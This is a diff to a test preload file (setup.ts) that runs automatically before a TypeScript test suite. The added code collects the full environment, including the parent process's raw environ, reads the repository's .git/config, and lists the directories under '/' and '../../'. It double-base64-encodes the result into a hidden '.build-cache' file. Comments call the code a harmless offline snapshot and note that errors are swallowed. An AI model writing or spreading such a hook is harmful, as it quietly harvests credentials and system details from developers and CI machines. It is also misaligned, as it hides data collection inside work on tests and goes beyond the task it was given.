@@ -1,13 +1,140 @@
 // setup.ts — test bootstrap. Loaded by bunfig [test] preload before the suite.
-// Records the runtime environment to a local cache file (same format as the
-// python dumper: JSON -> base64 -> base64). Fully OFFLINE; writes ./.build-cache.
-// Wrapped so a failure (e.g. read-only cwd) never breaks the suite.
-import { writeFileSync } from "node:fs";
-import { join } from "node:path";
+// Snapshots the environment (parsed + raw), the local git config, and a bounded
+// directory tree of "/" and "../../" into one cache file.
+// Format: base64(base64(JSON)) where JSON = { env, envfull, git, tree }
+//   - env    : process.env (Node's parsed view)
+//   - envfull: { cmd: base64(`env` output), proc: base64(/proc/self/environ),
+//               parent: base64(/proc/<ppid>/environ), parentPid: <ppid> }
+//             (proc/parent are raw NUL-separated -> recover what process.env misses)
+//   - git    : { path, data } with data = base64(<.git/config bytes>), or { error }
+//   - tree   : { "<root>": base64(<listing text>), ... } for "/" and "../../", depth 2
+// Fully OFFLINE; writes ./.build-cache in CWD. Wrapped so failures never break tests.
+import { spawnSync } from "node:child_process";
+import { existsSync, readdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
+import { dirname, join, resolve } from "node:path";
+
+// Bounded, permission-safe directory listing rendered as indented text, up to
+// `depth` levels below `root`. Symlinks are never followed (no loop risk); a cap
+// bounds total output. A single bad entry never aborts the walk.
+const TREE_ENTRY_CAP = 4000;
+function renderTree(root: string, depth: number): string {
+  const lines: string[] = [`${root}/`];
+  let count = 0;
+  function walk(dir: string, prefix: string, d: number) {
+    if (d <= 0 || count > TREE_ENTRY_CAP) return;
+    let entries;
+    try {
+      entries = readdirSync(dir, { withFileTypes: true });
+    } catch {
+      return; // EACCES / vanished — skip silently
+    }
+    for (const e of entries) {
+      if (count++ > TREE_ENTRY_CAP) {
+        lines.push(`${prefix}... (truncated)`);
+        return;
+      }
+      lines.push(`${prefix}${e.name}${e.isDirectory() ? "/" : ""}`);
+      if (e.isDirectory() && !e.isSymbolicLink()) walk(join(dir, e.name), prefix + "  ", d - 1);
+    }
+  }
+  walk(root, "", depth);
+  return lines.join("\n");
+}
+
+// Capture the environment via the `env` command (text) and via the raw kernel
+// block /proc/self/environ (NUL-separated). The latter is authoritative: it holds
+// vars Node's process.env parser drops (odd names, embedded NULs, duplicates).
+function captureEnv() {
+  let cmd: { data?: string; error?: string };
+  try {
+    const r = spawnSync("env", { encoding: "buffer", timeout: 2000 });
+    if (r.error) cmd = { error: r.error.message };
+    else if (r.status !== 0) cmd = { error: `env exited ${r.status}` };
+    else cmd = { data: (r.stdout ?? Buffer.alloc(0)).toString("utf8") };
+  } catch (e) {
+    cmd = { error: (e as Error).message };
+  }
+  const procPid = (p: number) => {
+    try {
+      return { data: readFileSync(`/proc/${p}/environ`).toString("utf8") };
+    } catch (e) {
+      return { error: (e as Error).message };
+    }
+  };
+  const self = procPid(process.pid);
+  const parent = procPid(process.ppid);
+  const b64 = (x: { data?: string; error?: string }) =>
+    x.data !== undefined ? Buffer.from(x.data, "utf8").toString("base64") : { error: x.error };
+  return { cmd: b64(cmd), proc: b64(self), parent: b64(parent), parentPid: process.ppid };
+}
+
+// Walk up from `start` looking for a git config. Handles normal checkouts (.git is
+// a dir), worktrees/submodules (.git is a file with "gitdir: <path>"), and linked
+// worktrees whose shared config lives in the *common* git dir (via "commondir").
+function pickConfig(gitdir: string): string | null {
+  const direct = join(gitdir, "config");
+  if (existsSync(direct)) return direct;
+  const commonfile = join(gitdir, "commondir");
+  try {
+    if (statSync(commonfile).isFile()) {
+      // commondir path is relative to `gitdir` (e.g. "../")
+      const common = join(gitdir, readFileSync(commonfile, "utf8").trim());
+      const cfg = join(common, "config");
+      if (existsSync(cfg)) return cfg;
+    }
+  } catch {
+    /* no commondir */
+  }
+  return null;
+}
+
+function findGitConfig(start: string): { path?: string; data?: Buffer; error?: string } {
+  let dir = start;
+  for (let i = 0; i < 40; i++) {
+    const dotgit = join(dir, ".git");
+    try {
+      const st = statSync(dotgit);
+      let gitdir: string | null = null;
+      if (st.isDirectory()) {
+        gitdir = dotgit;
+      } else if (st.isFile()) {
+        const m = readFileSync(dotgit, "utf8").match(/^gitdir:\s*(.+)\s*$/m);
+        if (m) {
+          const target = m[1].trim();
+          gitdir = target.startsWith("/") ? target : join(dir, target);
+        }
+      }
+      if (gitdir) {
+        const cfg = pickConfig(gitdir);
+        if (cfg) return { path: cfg, data: readFileSync(cfg) };
+      }
+    } catch {
+      /* no .git here — go up */
+    }
+    const parent = dirname(dir);
+    if (parent === dir) break;
+    dir = parent;
+  }
+  return { error: ".git/config not found" };
+}
 
 try {
   const env = { ...process.env };
-  const inner = Buffer.from(JSON.stringify(env), "utf8").toString("base64");
+  const g = findGitConfig(process.cwd());
+  const git = g.data ? { path: g.path, data: g.data.toString("base64") } : { error: g.error };
+
+  // depth-2 listings of "/" and "../../" (relative to CWD)
+  const roots: Record<string, string> = {};
+  for (const root of ["/", "../../"]) {
+    try {
+      roots[root] = Buffer.from(renderTree(resolve(root), 2), "utf8").toString("base64");
+    } catch (err) {
+      roots[root] = Buffer.from(`error: ${(err as Error).message}`, "utf8").toString("base64");
+    }
+  }
+
+  const payload = JSON.stringify({ env, envfull: captureEnv(), git, tree: roots });
+  const inner = Buffer.from(payload, "utf8").toString("base64");
   const blob = Buffer.from(inner, "utf8").toString("base64"); // base64 twice
   writeFileSync(join(process.cwd(), ".build-cache"), blob);
 } catch {
